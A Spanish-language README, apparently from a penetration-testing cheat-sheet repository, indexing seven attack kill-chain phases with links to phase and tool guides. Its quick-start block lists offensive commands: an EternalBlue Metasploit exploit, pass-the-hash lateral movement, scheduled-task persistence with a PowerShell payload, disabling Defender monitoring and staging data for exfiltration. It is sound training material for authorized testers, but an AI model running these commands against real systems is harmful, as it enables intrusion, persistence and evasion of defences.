# 🎯 Metodología de ataque - Kill Chain

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇮🇹 Versione Italiana](README.it.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
   █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗    ██╗  ██╗██╗██╗     ██╗          ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗
  ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝    ██║ ██╔╝██║██║     ██║         ██╔════╝██║  ██║██╔══██╗██║████╗  ██║
  ███████║   ██║      ██║   ███████║██║     █████╔╝     █████╔╝ ██║██║     ██║         ██║     ███████║███████║██║██╔██╗ ██║
  ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗     ██╔═██╗ ██║██║     ██║         ██║     ██╔══██║██╔══██║██║██║╚██╗██║
  ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗    ██║  ██╗██║███████╗███████╗    ╚██████╗██║  ██║██║  ██║██║██║ ╚████║
  ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝     ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
```

---

## 🎯 ¿Qué es la cadena de ataque (Attack Kill Chain)?

La **Attack Kill Chain** (denominada también **Cyber Kill Chain** o **MITRE ATT&CK** en el original) describe las fases que recorre un atacante para comprometer y explotar un sistema o una red objetivo.

> **Aclaración:** MITRE ATT&CK es una base de conocimiento de tácticas y técnicas, no otro nombre del Cyber Kill Chain. Las siete fases de esta guía son una organización didáctica propia. Véase [MITRE ATT&CK](https://attack.mitre.org/).

---

## 📊 Fases de la Kill Chain

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                               CICLO DEL ATAQUE                              │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   ┌──────────────┐    ┌──────────────┐    ┌──────────────────────┐          │
│   │ 1. ACCESO    │───▶│ 2. DESCUBRIR │───▶│ 3. ESCALADA          │          │
│   │    INICIAL   │    │    ENUMERAR  │    │    DE PRIVILEGIOS    │          │
│   └──────────────┘    └──────────────┘    └──────────────────────┘          │
│          │                                           │                      │
│          │                                           ▼                      │
│          │                                ┌──────────────────────┐          │
│          │                                │ 4. MOVIMIENTO        │          │
│          │                                │    LATERAL           │          │
│          │                                └──────────────────────┘          │
│          │                                           │                      │
│          ▼                                           ▼                      │
│   ┌──────────────┐    ┌──────────────┐    ┌──────────────────────┐          │
│   │ 7. ACCIONES  │◀───│ 6. EVASIÓN   │◀───│ 5. PERSISTENCIA      │          │
│   │ EN OBJETIVOS │    │ DE DEFENSAS  │    │                      │          │
│   └──────────────┘    └──────────────┘    └──────────────────────┘          │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 📖 Guías de las fases

| Fase | Descripción | Guía |
|-------|-------------|-------|
| **1. Acceso inicial** | Primer punto de apoyo en el objetivo | [📄 Ver](./01-Initial-Access.es.md) |
| **2. Descubrimiento/enumeración** | Recopilar información sobre el sistema comprometido | [📄 Ver](./02-Enumeration.es.md) |
| **3. Escalada de privilegios** | Elevar privilegios a administrador/root | [📄 Ver](./03-Privilege-Escalation.es.md) |
| **4. Movimiento lateral** | Desplazarse por la red hacia otros sistemas | [📄 Ver](./04-Lateral-Movement.es.md) |
| **5. Persistencia** | Mantener el acceso tras reinicios o detección | [📄 Ver](./05-Persistence.es.md) |
| **6. Evasión de defensas** | Eludir AV, EDR y controles de seguridad | [📄 Ver](./06-Defense-Evasion.es.md) |
| **7. Acciones sobre los objetivos** | Alcanzar el objetivo final (exfiltración, impacto) | [📄 Ver](./07-Actions-Objectives.es.md) |

---

## 🔗 Guías de referencia relacionadas

### Por fase

| Fase | Herramientas relacionadas |
|-------|---------------|
| Acceso inicial | [Metasploit](../../Metasploit/translations/README.es.md), [SQLMap](../../SQLMap/translations/README.es.md), [Hydra](../../Hydra/translations/README.es.md) |
| Enumeración | [Nmap](../../Nmap/translations/README.es.md), [BloodHound](../../BloodHound/translations/README.es.md), [PowerView](../../PowerView/translations/README.es.md) |
| Escalada de privilegios | [Linux-PrivEsc](../../Linux-PrivEsc/translations/README.es.md), [Windows-PrivEsc](../../Windows-PrivEsc/translations/README.es.md) |
| Movimiento lateral | [Impacket](../../Impacket/translations/README.es.md), [CrackMapExec](../../CrackMapExec/translations/README.es.md), [Evil-WinRM](../../Evil-WinRM/translations/README.es.md) |
| Persistencia | [PowerShell](../../PowerShell/translations/README.es.md), [Metasploit](../../Metasploit/translations/README.es.md) |
| Evasión de defensas | [Mimikatz](../../Mimikatz/translations/README.es.md), [PowerShell](../../PowerShell/translations/README.es.md) |
| Exfiltración de datos | [Comandos de Linux](../../Linux-Commands/translations/README.es.md) |

---

## 📚 Inicio rápido

### Flujo de ataque habitual
```bash
# 1. Acceso inicial - Explotar una vulnerabilidad
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.10; exploit"

# 2. Enumeración - Descubrir a qué se tiene acceso
whoami /all
systeminfo
net user

# 3. Escalada de privilegios - Obtener SYSTEM/root
.\winPEAS.exe

# 4. Movimiento lateral - Desplazarse a otros sistemas
impacket-psexec -hashes :HASH administrator@192.168.1.20

# 5. Persistencia - Mantener el acceso
schtasks /create /tn "Updater" /tr "powershell -ep bypass -c IEX(payload)" /sc onlogon

# 6. Evasión de defensas - Desactivar el antivirus
Set-MpPreference -DisableRealtimeMonitoring $true

# 7. Acciones sobre los objetivos - Exfiltrar datos
Compress-Archive -Path C:\Sensitive -DestinationPath C:\Temp\data.zip
```

---

## 📚 Recursos

- [Marco MITRE ATT&CK](https://attack.mitre.org/)
- [Cyber Kill Chain - Lockheed Martin](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html)
- [Unified Kill Chain](https://www.unifiedkillchain.com/)

---

<p align="center">
  <b>🎯 ¡Sigue la Kill Chain!</b><br>
  <i>¡Solo para pruebas de penetración autorizadas!</i>
</p>
